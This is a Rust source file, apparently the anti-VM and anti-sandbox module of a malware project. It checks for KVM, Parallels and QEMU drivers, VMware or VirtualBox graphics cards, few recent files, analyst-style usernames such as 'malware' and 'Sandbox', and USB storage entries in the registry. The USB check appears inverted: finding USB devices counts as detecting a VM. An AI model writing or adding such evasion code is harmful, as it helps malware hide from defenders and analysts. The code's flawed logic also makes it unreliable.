use std::env::{self};
use std::path::Path;
use std::fs;
use std::process::{Command, Stdio};
use std::str;

enum AntiVMError {
    SystemRootNotfound,
    EntryError,
    CommandError,
    StringError
}

fn check_for_kvm() -> Result<bool, AntiVMError> {
    let bad_drivers_list = vec![
        "balloon.sys",
        "netkvm.sys",
        "vioinput",
        "viofs.sys",
        "vioser.sys",
    ];

    let system_root = match env::var("SystemRoot") {
        Ok(s) => s,
        Err(_) => {
            return Err(AntiVMError::SystemRootNotfound)
        }   
    };

    let mut kvm_detected = false;

    for driver in bad_drivers_list {
        let path = Path::new(&system_root).join("System32").join(driver);
        if path.exists() {
            kvm_detected = true;
            break;
        }
    }

    Ok(kvm_detected)
}

fn check_for_parallels() -> Result<bool, AntiVMError> {
    let parallels_drivers = vec!["prl_sf", "prl_tg", "prl_eth"];
    let system_root = match env::var("SystemRoot") {
        Ok(s) => s,
        Err(_) => {
            return Err(AntiVMError::SystemRootNotfound)
        }   
    };

    let sys32_folder = system_root + "\\System32";

    let entries = match fs::read_dir(sys32_folder) {
        Ok(s) => s,
        Err(_) => {
            return Err(AntiVMError::EntryError)
        }  
    };

    for entry in entries {
        let entry = match entry {
            Ok(s) => s,
            Err(_) => {
                return Err(AntiVMError::EntryError)
            }   
        };

        let file_name = entry.file_name();
        let file_name_str = file_name.to_string_lossy();

        for driver in &parallels_drivers {
            if file_name_str.contains(driver) {
                return Ok(true);
            }
        }
    }

    Ok(false)
}

fn check_for_qemu() -> Result<bool, AntiVMError> {
    let qemu_drivers = vec!["qemu-ga", "qemuwmi"];
    let system_root = match env::var("SystemRoot") {
        Ok(s) => s,
        Err(_) => {
            return Err(AntiVMError::SystemRootNotfound)
        }   
    };

    let sys32_folder = system_root + "\\System32";

    let entries = match fs::read_dir(sys32_folder) {
        Ok(s) => s,
        Err(_) => {
            return Err(AntiVMError::EntryError)
        }  
    };

    for entry in entries {
        let entry = match entry {
            Ok(s) => s,
            Err(_) => {
                return Err(AntiVMError::EntryError)
            }   
        };

        let file_name = entry.file_name();
        let file_name_str = file_name.to_string_lossy();

        for driver in &qemu_drivers {
            if file_name_str.contains(driver) {
                return Ok(true);
            }
        }
    }

    Ok(false)
}

fn recent_file_activity_check() -> Result<bool, AntiVMError> {
    let app_data = match env::var("APPDATA") {
        Ok(s) => s,
        Err(_) => {
            return Err(AntiVMError::EntryError)
        }   
    };
    let rec_dir = format!("{}\\microsoft\\windows\\recent", app_data);

    let files = match fs::read_dir(rec_dir) {
        Ok(s) => s,
        Err(_) => {
            return Err(AntiVMError::EntryError)
        }  
    };

    let file_count = files.count();

    if file_count < 20 {
        return Ok(true);
    }

    Ok(false)
}

fn plugged_in() -> Result<bool, AntiVMError> {
    let output = match Command::new("reg")
        .args(&["query", "HKLM\\SYSTEM\\ControlSet001\\Enum\\USBSTOR"])
        .output() 
        {
            Ok(s) => s,
            Err(_) => {
                return Err(AntiVMError::CommandError)
            }  
    };

    if !output.status.success() {
        return Err(AntiVMError::CommandError)
    }

    let output_str = match str::from_utf8(&output.stdout) {
        Ok(s) => s,
        Err(_) => {
            return Err(AntiVMError::StringError)
        }  
    };
    let usb_lines: Vec<&str> = output_str.split('\n').collect();

    let mut plugged_usb = 0;
    for line in usb_lines {
        if !line.trim().is_empty() {
            plugged_usb += 1;
        }
    }

    if plugged_usb < 1 {
        return Ok(false);
    }

    Ok(true)
}

fn check_for_blacklisted_names() -> bool {
    let blacklisted_names = vec![
        "Johnson", 
        "Miller", 
        "malware", 
        "maltest", 
        "CurrentUser", 
        "Sandbox", 
        "virus", 
        "John Doe", 
        "test user", 
        "sand box", 
        "WDAGUtilityAccount"
    ];

    if let Ok(username) = env::var("USERNAME") {
        let username_lower = username.to_lowercase();

        for name in &blacklisted_names {
            if username_lower == name.to_lowercase() {
                return true;
            }
        }
    }

    false
}

fn graphics_card_check() -> Result<bool, AntiVMError> {
    let output = match Command::new("wmic")
        .args(&["path", "win32_VideoController", "get", "name"])
        .stdout(Stdio::piped())
        .output() 
        {
            Ok(s) => s,
            Err(_) => return Err(AntiVMError::CommandError),
    };
        

    if !output.status.success() {
        return Err(AntiVMError::CommandError)
    }

    let gpu_output = String::from_utf8_lossy(&output.stdout);
    let detected = gpu_output.to_lowercase().contains("vmware") || gpu_output.to_lowercase().contains("virtualbox");

    Ok(detected)
}

pub fn check_anti_vm() -> bool {
    if check_for_blacklisted_names() {
        return true
    }

    match graphics_card_check() {
        Ok(r) => {
            if r {
                return true;
            }
        },
        Err(_) => {
            if cfg!(debug_assertions) {
                println!("(antivm.rs:check_anti_vm) Failed to check for GPU's")
            } 

            return false;
        }
    }

    match check_for_kvm() {
        Ok(r) => {
            if r {
                return true;
            }
        },
        Err(_) => {
            if cfg!(debug_assertions) {
                println!("(antivm.rs:check_anti_vm) Failed to check for kvm")
            } 

            return false;
        }
    }

    match check_for_parallels() {
        Ok(r) => {
            if r {
                return true;
            }
        },
        Err(_) => {
            if cfg!(debug_assertions) {
                println!("(antivm.rs:check_anti_vm) Failed to check for parallels")
            } 

            return false;
        }
    }

    match check_for_qemu() {
        Ok(r) => {
            if r {
                return true;
            }
        },
        Err(_) => {
            if cfg!(debug_assertions) {
                println!("(antivm.rs:check_anti_vm) Failed to check for qemu")
            } 

            return false;
        }
    }

    match recent_file_activity_check() {
        Ok(r) => {
            if r {
                return true;
            }
        },
        Err(_) => {
            if cfg!(debug_assertions) {
                println!("(antivm.rs:check_anti_vm) Failed to check for recent file activity")
            } 

            return false;
        }
    }

    match plugged_in() {
        Ok(r) => {
            if r {
                return true;
            }
        },
        Err(_) => {
            if cfg!(debug_assertions) {
                println!("(antivm.rs:check_anti_vm) Failed to check for USB devices")
            } 

            return false;
        }
    }
    
    false
}